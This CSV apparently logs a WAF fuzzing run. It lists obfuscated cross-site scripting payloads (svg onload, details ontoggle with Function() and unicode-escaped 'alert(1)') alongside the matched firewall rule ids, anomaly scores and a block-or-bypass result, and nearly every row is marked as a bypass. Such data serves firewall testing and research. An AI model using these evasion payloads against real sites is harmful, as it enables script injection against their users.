index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
19,<svg onload=Function(atob('YWxlcnQoMSk='))()>,0,1,block,4,"941100,941120,941160,949110","v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628753158.536280
211,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details></details></details>",0,1,bypass,2,"941100,941120","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628768694.446801
214,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details></details></details>",0,1,bypass,2,"941100,941120","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628768834.767398
215,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details></details></details>,0,1,bypass,2,"941100,941120","v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628768935.804317
224,<details ontoggle=Function(&quot;\&#117;0061\u006c\u0065\u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628769693.472249
225,<details ontoggle=Function(&quot;\u0061\&#117;006c\u0065\u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628769716.009930
226,<details ontoggle=Function(&quot;\u0061\u006c\&#117;0065\u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628769872.796031
227,<details ontoggle=Function(&quot;\u0061\u006c\u0065\&#117;0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628769820.382235
228,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\&#117;0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628769978.187239
235,"<details ontoggle=""Function(&quot;\&#117;0061\&#117;006c\&#117;0065\&#117;0072\&#117;0074(1)&quot;)()"" open>",0,1,bypass,2,"941100,941120","v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628770534.052833
236,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details></details></details>,0,1,bypass,2,"941100,941120","v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762877061.829698
237,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details open></details></details>,0,1,bypass,2,"941100,941120","v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628770791.698573
238,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><summary></summary></details>",0,1,bypass,2,"941100,941120","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628770868.164084
239,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><summary>Click</summary></details>",0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628770951.448346
240,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><summary><details></details></summary></details>",0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771097.615281
241,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><summary><details></details></summary></details>,0,1,bypass,2,"941100,941120","v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771034.670509
242,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><summary><details></details></summary></details>,0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771174.192706
243,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><summary><details></details></summary></details>",0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771288.661997
244,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><summary><details></details></summary></details>,0,1,bypass,2,"941100,941120","v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762877133.009318
245,"<details id=test ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details></details></details>",0,1,bypass,2,"941100,941120","v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771440.213935
246,"<details class=test ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details></details></details>",0,1,bypass,2,"941100,941120","v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o19,10v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771588.430574
247,"<details name=test ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details></details></details>",0,1,bypass,2,"941100,941120","v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o18,10v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771683.204943
248,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open id=x><details></details></details>",0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771628.871582
249,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open class=x><details></details></details>",0,1,bypass,2,"941100,941120","v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771716.478376
250,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open id=x><details></details></details>,0,1,bypass,2,"941100,941120","v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771832.149142
251,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open class=x><details></details></details>,0,1,bypass,2,"941100,941120","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771968.153527
252,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open id=x><details></details></details>,0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628771937.927447
253,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open class=x><details></details></details>,0,1,bypass,2,"941100,941120","v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772090.587169
254,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details id=x></details></details>",0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772189.314057
255,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details class=x></details></details>",0,1,bypass,2,"941100,941120","v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772252.793602
256,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details id=x></details></details>,0,1,bypass,2,"941100,941120","v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772399.268798
257,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details class=x></details></details>,0,1,bypass,2,"941100,941120","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772416.422030
258,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><details id=x></details></details>,0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772446.086659
259,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><details class=x></details></details>,0,1,bypass,2,"941100,941120","v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772541.541035
260,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details id=x></details></details>",0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772631.639116
261,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details class=x></details></details>",0,1,bypass,2,"941100,941120","v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772728.313480
262,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details id=x></details></details>,0,1,bypass,2,"941100,941120","v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772841.540426
263,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details class=x></details></details>,0,1,bypass,2,"941100,941120","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772999.426268
264,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><details id=x></details></details>,0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628772949.941993
265,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><details class=x></details></details>,0,1,bypass,2,"941100,941120","v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773089.919461
266,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details open></details></details>",0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773196.564818
267,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><details open></details></details>,0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773210.189806
268,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details open></details></details>",0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773351.404506
269,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details open></details></details>,0,1,bypass,2,"941100,941120","v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773396.229694
270,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><details open></details></details>,0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773472.137699
271,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details><summary></summary></details></details>",0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762877353.908756
272,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details><summary></summary></details></details>,0,1,bypass,2,"941100,941120","v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773673.691517
273,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><details><summary></summary></details></details>,0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773753.149338
274,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details><summary></summary></details></details>",0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773876.006336
275,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details><summary></summary></details></details>,0,1,bypass,2,"941100,941120","v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773850.490069
276,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><details><summary></summary></details></details>,0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628773916.034874
277,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details open><summary></summary></details></details>",0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628774094.195153
